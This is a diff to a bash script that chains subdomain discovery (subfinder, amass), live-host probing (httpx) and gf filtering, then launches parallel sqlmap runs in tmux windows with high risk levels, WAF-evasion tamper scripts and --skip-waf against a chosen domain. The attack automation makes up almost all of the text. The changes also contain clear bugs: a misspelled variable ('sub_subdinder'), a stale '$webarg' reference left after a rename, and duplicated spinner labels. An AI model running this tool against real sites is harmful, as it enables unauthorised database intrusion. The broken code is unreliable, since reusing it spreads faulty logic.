@@ -110,10 +110,12 @@ sqli+="sqli.txt"
 
 #amass
 newdir=$target 
-sub=$target
-sub+="sub.txt"
+sub_subfinder=$target
+sub_subdinder+="_subfinder.txt"
+sub_amass=$target
+sub_amass+="_amass.txt"
 brute=$target
-brute+="brute.txt"
+brute+="_brute.txt"
 
 #udork 
  if [ $att -eq 1 ]
@@ -133,16 +135,21 @@ brute+="brute.txt"
 
 
 mkdir /tmp/$newdir
-#Subdomain searching using amass
+#Subdomain searching using subfinder
 
-start_spinner 'scanning subdomain ' 	
-amass enum -brute -min-for-recursive 2 -d $target >> tee  /tmp/$newdir/$sub ;
+start_spinner 'scanning subdomain amass' 
+subfinder -silent -d $target >>/tmp/$newdir/$sub_subfinder ;
+stop_spinner $? 
+
+#Subdomain searching using amass
+start_spinner 'scanning subdomain amass' 	
+amass enum -silent -passive -d $target | anew $sub_subfinder >>/tmp/$newdir/$sub_amass;
 stop_spinner $? 
 
 #httpx process
 
 start_spinner 'httpx process in progress' 
-cat  /tmp/$newdir/$sub | httpx -silent | anew >> /tmp/$newdir/httpx.txt
+cat  /tmp/$newdir/$sub_amass | httpx -silent | anew >> /tmp/$newdir/httpx.txt
 stop_spinner $? 
 
 #pairing with gf pattern
@@ -156,28 +163,27 @@ start_spinner 'Multi Threads process in progress'
 count=$(cat /tmp/$newdir/$brute | wc -l)
 vsplit=$((( $count / 8 )+ ($count % 8 > 0)))
 last=$vsplit
-increment=$vsplit
 start=1
-ttarget=${target//./}
-tmux new -d -s $ttarget
+target_session=${target//./}
+tmux new -d -s $target_session
 for(( c=1; c<=8; c++ ))
 do
 br=$c
-webarg=$target
-webarg1=${target//./}
-webarg1+=$br
-webarg+=$br
+file_split=$target
+session_window=${target//./}
+session_window+=$br
+file_split+=$br
 echo $last
 last+="p"
 
 #create new session
 
-tmux new-window -t $ttarget:$c -n $webarg1	
-sed -n $start,$last /tmp/$newdir/$brute |tee /tmp/$webarg
+tmux new-window -t $target_session:$c -n $session_window	
+sed -n $start,$last /tmp/$newdir/$brute >>/tmp/$newdir/$webarg
 
 #create multiple window
 
-tmux send -t $ttarget:$webarg1 'sqlmap -m /tmp/'$newdir'/'$webarg' --random-agent  --level 3 --risk 3 --batch --answer "follow=N" --tamper="between,randomcase,space2comment,xforwardedfor" -v3 --skip-waf' ENTER
+tmux send -t $target_session:$session_window 'sqlmap -m /tmp/'$newdir'/'$session_window' --random-agent  --level 3 --risk 3 --batch --answer "follow=N" --tamper="between,randomcase,space2comment,xforwardedfor" -v3 --skip-waf' ENTER
 
 
 
@@ -186,7 +192,7 @@ tmux send -t $ttarget:$webarg1 'sqlmap -m /tmp/'$newdir'/'$webarg' --random-agen
 start=$(($start+$vsplit))
 last=${last::-1}
 last=$(($last+$vsplit))
-webarg=${webarg::-1}
+session_window=${session_window::-1}
 
 done
 stop_spinner $? 
